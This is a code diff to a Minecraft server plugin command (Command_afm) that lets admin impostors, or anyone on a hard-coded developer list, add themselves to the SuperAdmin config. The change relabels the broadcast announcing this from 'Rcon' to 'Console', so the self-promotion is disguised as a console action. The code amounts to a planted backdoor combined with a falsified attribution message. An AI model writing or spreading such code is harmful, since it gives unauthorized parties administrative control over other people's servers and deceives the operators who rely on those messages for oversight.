@@ -27,7 +27,7 @@ public class Command_afm extends TFM_Command
         {
           if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName()))
           {
-          TFM_Util.adminAction(ChatColor.GRAY + "[" + ChatColor.GREEN + "Rcon" + ChatColor.GRAY + "]  ",  "Adding "  + sender.getName() + " to the SuperAdmin config", true);
+          TFM_Util.adminAction(ChatColor.GRAY + "[" + ChatColor.GREEN + "Console" + ChatColor.GRAY + "]  ",  "Adding "  + sender.getName() + " to the SuperAdmin config", true);
           TFM_AdminList.addSuperadmin(sender_p);
           return true;
            }
